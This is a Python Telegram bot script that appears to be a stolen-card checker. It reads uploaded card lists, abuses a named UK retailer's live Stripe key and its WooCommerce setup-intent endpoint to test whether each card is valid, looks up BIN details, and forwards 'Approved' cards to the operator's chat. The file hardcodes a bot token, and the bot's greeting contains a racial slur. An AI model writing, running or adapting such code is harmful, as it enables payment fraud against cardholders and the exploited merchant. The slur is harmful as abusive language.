import requests
import random
import string
import re
import sys
from bs4 import BeautifulSoup
import user_agent
import os
import telebot

TOKEN = "8134725362:AAF44hc8HcxdcZlDYfP7luvaO7T_aNnM-1U"
ID = "7613434345"
print("/start Your Bot")
bot = telebot.TeleBot(TOKEN)
admin = ID
ua = user_agent.generate_user_agent()

def nonce_id():
    headers = {'user-agent': ua}
    response = requests.get('https://www.amsons.co.uk/my-account/add-payment-method/', headers=headers)
    match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-fA-F0-9]+)"', response.text)
    return match.group(1) if match else None

def get_id(cc, mm, yy, cvv):
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': ua,
    }
    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'IN',
        'payment_user_agent': 'stripe.js/5ea0d5a7b4; stripe-js-v3/5ea0d5a7b4; payment-element; deferred-intent',
        'referrer': 'https://www.amsons.co.uk',
        'time_on_page': str(random.randint(10000, 60000)),
        'client_attribution_metadata[client_session_id]': '3ec07baa-adab-4334-a3dd-f9c09184fe29',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': 'c13855f7-15a5-4028-8920-f51341b4c44d42ae05',
        'muid': '8d408980-d5dc-4ae0-ac80-c86dc0dddc4513472d',
        'sid': '88ef3efa-d1b7-46ed-9129-d0d23bd4bc5a0ed2e9',
        'key': 'pk_live_51HOiwNEd5KxWjPnfRdU08zhvpQx2jzI9MfK2IEJionX9xVdhFCLBZ9BAlpGVRzrFkukUvM6sBFEDVvOx6CfY0pDQ00hRNkYg2T',
        '_stripe_version': '2024-06-20',
    }
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    return response.json()['id'] if response.status_code == 200 else None

def final(iddd, nonce):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.amsons.co.uk',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.amsons.co.uk/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ua,
        'x-requested-with': 'XMLHttpRequest',
    }
    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': iddd,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    response = requests.post('https://www.amsons.co.uk/', params=params, headers=headers, data=data)
    return response.text
    
def bin_dt(bin):
        try:
            api_url = requests.get("https://bins.antipublic.cc/bins/" + str(bin), timeout=30).json()
            return api_url
        except:
            return None

def return_info(api):
        if not api or 'Invalid BIN' in api or 'detail' in api:
            return "BIN Lookup Failed"
        brand = api.get("brand", "Unknown")
        card_type = api.get("type", "Unknown")
        level = api.get("level", "Unknown")
        bank = api.get("bank", "Unknown")
        country_name = api.get("country_name", "Unknown")
        country_flag = api.get("country_flag", "")
        bin = api.get('bin', "Unknown")
        look = f"""
    𝗕𝗶𝗻 : {bin}
    𝗜𝗻𝗳𝗼 : {brand}-{card_type}-{level}
    𝗕𝗮𝗻𝗸 : {bank}
    𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country_name} {country_flag}
    """
        return look

@bot.message_handler(commands=['start'])
def start(message):
        bot.reply_to(message, "Hello Nigga\nSend Me CC List(.txt)..!!", parse_mode="markdown")

@bot.message_handler(content_types=['document'])
def chk_compo(message):
        finfo = bot.get_file(message.document.file_id)
        downlod = bot.download_file(finfo.file_path)
        path = os.path.join("files", message.document.file_name)
        os.makedirs("files", exist_ok=True)
        with open(path, "wb") as compo:
            compo.write(downlod)

        with open(path, encoding="utf-8") as file:
            total_lines = sum(1 for line in file)

        progress_message = bot.reply_to(message, 
            f"Hold On <> Checking your combo..!!\nProgress : 0/{total_lines}", 
            parse_mode="markdown")

        checked_lines = 0
        with open(path, encoding="utf-8") as file:
            for line in file:
                cc_line = line.strip()
                checked_lines += 1
                try:
                    cc, mm, yy, cvv = cc_line.split('|')
                    yy = '20' + yy if len(yy) == 2 else yy
                except ValueError:
                    print(f"Invalid format: {cc_line}")
                    continue

                bin_number = cc[:6]
                look = bin_dt(bin_number)
                iddd = get_id(cc, mm, yy, cvv)
                if iddd:
                    nonce = nonce_id()
                    if nonce:
                        response_text = final(iddd, nonce)
                        if 'succeeded' in response_text:
                            mess = f'''
    𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

    𝗖𝗮𝗿𝗱 : {cc_line}
    𝗚𝗮𝘁𝗲𝘄𝗮𝘆 : Stripe Auth
    𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : Card Added Successfully
    {return_info(look)}
    BY - @RussianPelo'''
                            bot.send_message(admin, mess, parse_mode="markdown")
                            print(f"✅ Approved : {cc_line} - @scrapperchannel_op")
                        else:
                            print(f"❌ Declined : {cc_line}")
                    else:
                        print(f"Nonce Error : {cc_line}")
                else:
                    print(f"Maybe Api Dead 🤡\nTry Again..!!")

                bot.edit_message_text(
                    chat_id=progress_message.chat.id,
                    message_id=progress_message.message_id,
                    text=f"Hold On <> Checking your combo..!!\nProgress : {checked_lines}/{total_lines}",
                    parse_mode="markdown"
                )

bot.infinity_polling(timeout=25)
